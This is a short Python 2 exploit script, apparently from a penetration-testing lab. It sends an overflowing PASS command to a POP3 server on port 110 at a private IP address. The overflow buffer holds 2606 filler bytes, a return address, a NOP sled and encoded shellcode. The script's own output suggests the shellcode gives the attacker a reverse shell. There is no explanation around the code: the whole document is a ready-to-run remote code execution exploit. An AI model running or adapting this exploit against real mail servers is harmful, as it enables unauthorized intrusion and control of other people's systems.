#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buf = ("\xdd\xc3\xbb\xc7\x65\x35\x34\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x52\x31\x58\x17\x83\xe8\xfc\x03\x9f\x76\xd7\xc1\xe3\x91\x95"
"\x2a\x1b\x62\xfa\xa3\xfe\x53\x3a\xd7\x8b\xc4\x8a\x93\xd9\xe8"
"\x61\xf1\xc9\x7b\x07\xde\xfe\xcc\xa2\x38\x31\xcc\x9f\x79\x50"
"\x4e\xe2\xad\xb2\x6f\x2d\xa0\xb3\xa8\x50\x49\xe1\x61\x1e\xfc"
"\x15\x05\x6a\x3d\x9e\x55\x7a\x45\x43\x2d\x7d\x64\xd2\x25\x24"
"\xa6\xd5\xea\x5c\xef\xcd\xef\x59\xb9\x66\xdb\x16\x38\xae\x15"
"\xd6\x97\x8f\x99\x25\xe9\xc8\x1e\xd6\x9c\x20\x5d\x6b\xa7\xf7"
"\x1f\xb7\x22\xe3\xb8\x3c\x94\xcf\x39\x90\x43\x84\x36\x5d\x07"
"\xc2\x5a\x60\xc4\x79\x66\xe9\xeb\xad\xee\xa9\xcf\x69\xaa\x6a"
"\x71\x28\x16\xdc\x8e\x2a\xf9\x81\x2a\x21\x14\xd5\x46\x68\x71"
"\x1a\x6b\x92\x81\x34\xfc\xe1\xb3\x9b\x56\x6d\xf8\x54\x71\x6a"
"\xff\x4e\xc5\xe4\xfe\x70\x36\x2d\xc5\x25\x66\x45\xec\x45\xed"
"\x95\x11\x90\xa2\xc5\xbd\x4b\x03\xb5\x7d\x3c\xeb\xdf\x71\x63"
"\x0b\xe0\x5b\x0c\xa6\x1b\x0c\x39\x3c\x23\xa1\x55\x40\x23\x38"
"\x1d\xcd\xc5\x50\x71\x98\x5e\xcd\xe8\x81\x14\x6c\xf4\x1f\x51"
"\xae\x7e\xac\xa6\x61\x77\xd9\xb4\x16\x77\x94\xe6\xb1\x88\x02"
"\x8e\x5e\x1a\xc9\x4e\x28\x07\x46\x19\x7d\xf9\x9f\xcf\x93\xa0"
"\x09\xed\x69\x34\x71\xb5\xb5\x85\x7c\x34\x3b\xb1\x5a\x26\x85"
"\x3a\xe7\x12\x59\x6d\xb1\xcc\x1f\xc7\x73\xa6\xc9\xb4\xdd\x2e"
"\x8f\xf6\xdd\x28\x90\xd2\xab\xd4\x21\x8b\xed\xeb\x8e\x5b\xfa"
"\x94\xf2\xfb\x05\x4f\xb7\x1c\xe4\x45\xc2\xb4\xb1\x0c\x6f\xd9"
"\x41\xfb\xac\xe4\xc1\x09\x4d\x13\xd9\x78\x48\x5f\x5d\x91\x20"
"\xf0\x08\x95\x97\xf1\x18")

print buf 
buffer = "\x41" * 2606 + "\x63\x56\x4b\x5f" + "\x90" * 8  + buf  #5F4B41E3
try:
	print "\nSending evil buffer..." 
	s.connect(('10.11.11.156',110)) 
	data = s.recv(1024)
	s.send('USER username' +'\r\n') 
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	s.close()
	print "\nDone. Did you reverse shell in?." 
except:
	print "Could not connect to POP3!"
